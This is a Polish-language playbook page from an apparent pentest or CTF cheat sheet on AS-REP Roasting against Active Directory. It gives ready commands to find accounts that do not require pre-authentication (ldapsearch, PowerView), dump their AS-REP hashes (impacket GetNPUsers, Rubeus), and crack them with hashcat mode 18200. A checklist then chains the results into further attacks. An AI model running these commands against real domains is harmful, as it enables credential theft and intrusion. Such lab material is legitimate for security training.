---
layout: ad_vector
title: AS-REP Roasting
slug: asrep-roasting
category: kerberos
order: 2
pre_reqs:
  - list_of_usernames_or_valid_user
  - reachable_kdc_port_88
  - user_with_UF_DONT_REQUIRE_PREAUTH_flag
tools: [impacket, rubeus, hashcat]
chain_inputs: [DOMAIN_FQDN, DC_IP, USER]
chain_outputs: [NT_HASH_offline, PASS]
progress_total: 7
---

## mechanism

Konto z ustawioną flagą `UF_DONT_REQUIRE_PREAUTH` (`0x400000`) NIE wymaga pre-authentication. KDC odpowiada AS-REP zawierającym **pojedynczo zaszyfrowany blok** (`enc-part`) kluczem pochodzącym z NT hasha usera. To materiał do offline crackingu.

Format hasha dla hashcat:

```
$krb5asrep$23$user@DOMAIN:<checksum>$<enc-part>
```

**Mode hashcat:** `18200` (Kerberos 5, AS-REP, etype 23 = RC4-HMAC).

## enumeracja konta z DONT_REQ_PREAUTH (jeśli masz sesję LDAP)

{% include cmd.html env="kali" cmd="ldapsearch -x -H ldap://$DC_IP -D '$USER@$DOMAIN_FQDN' -w '$PASS' -b 'DC=$DOMAIN,DC=htb' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName" %}

{% include cmd.html env="windows" cmd="Get-DomainUser -PreauthNotRequired -Properties samaccountname,useraccountcontrol | fl" note="PowerView" %}

## impacket — GetNPUsers.py

<details>
<summary>[+] wyjaśnienie flag</summary>

- `$DOMAIN/` → prefix, samo `-` po slashu = null session (bez creds; działa jeśli DC pozwala na anon)
- `-usersfile users.txt` → lista userów do sprawdzenia (brak = wymaga sesji + iteruje LDAP)
- `-request` → zażądaj AS-REP dla wyliczonych/podanych userów
- `-format hashcat` → output w formacie krb5asrep$23$... (alt: john)
- `-outputfile asrep.hash` → zrzuć do pliku
- `-dc-ip $DC_IP` → wymuś konkretny KDC

</details>

{% include cmd.html env="kali" cmd="GetNPUsers.py $DOMAIN_FQDN/ -usersfile users_valid.txt -request -format hashcat -outputfile asrep.hash -dc-ip $DC_IP -no-pass" %}

{% include cmd.html env="kali" cmd="GetNPUsers.py $DOMAIN_FQDN/$USER:'$PASS' -request -format hashcat -outputfile asrep.hash -dc-ip $DC_IP" note="z sesją — iteruje wszystkich w LDAP i filtruje flagę" %}

{% include cmd.html env="pwnbox" cmd="impacket-GetNPUsers $DOMAIN_FQDN/ -usersfile users_valid.txt -request -format hashcat -o asrep.hash -dc-ip $DC_IP -no-pass" %}

## rubeus (from Windows session)

<details>
<summary>[+] wyjaśnienie flag</summary>

- `asreproast` → tryb działania
- `/format:hashcat` → format wyjściowy (alt: `/format:john`)
- `/outfile:asrep.hash` → zrzut
- `/nowrap` → jednoliniowo, wygodne do kopiowania
- `/user:$USER` → konkretny user (bez tego iteruje wszystkich z LDAP)

</details>

{% include cmd.html env="windows" cmd="Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash /nowrap" %}

{% include cmd.html env="windows" cmd="Rubeus.exe asreproast /user:$USER /format:hashcat /nowrap" %}

## crack — hashcat 18200

{% include cmd.html env="kali" cmd="hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force" %}

{% include cmd.html env="kali" cmd="hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule --force" note="z regułą — dłużej ale +30-50% skuteczność" %}

{% include cmd.html env="kali" cmd="hashcat -m 18200 asrep.hash --show" note="pokazuje trafienia z .potfile" %}

## checklist

- [ ] zebrałem listę userów z `kerbrute userenum` lub LDAP
- [ ] wygenerowałem `asrep.hash` (impacket lub rubeus)
- [ ] uruchomiłem hashcat -m 18200 z rockyou
- [ ] jeśli fail — dołożyłem regułę OneRuleToRuleThemAll
- [ ] złamane hasło wrzuciłem do `$USER` / `$PASS` w kontekście
- [ ] przekazałem do Kerberoastingu (o ile user ma SPN, iteruj dalej)
- [ ] follow-up: BloodHound edge `HasSession` / `AdminTo` na tym userze

## troubleshoot

- **KDC_ERR_C_PRINCIPAL_UNKNOWN** → literówka w username, lub konto nie istnieje. Sprawdź `kerbrute userenum`.
- **KDC_ERR_PREAUTH_REQUIRED** → user istnieje ale nie ma `DONT_REQ_PREAUTH`. Nie ten wektor.
- **Clock skew too great** → `ntpdate -u $DC_IP` albo `sudo rdate -n $DC_IP`.
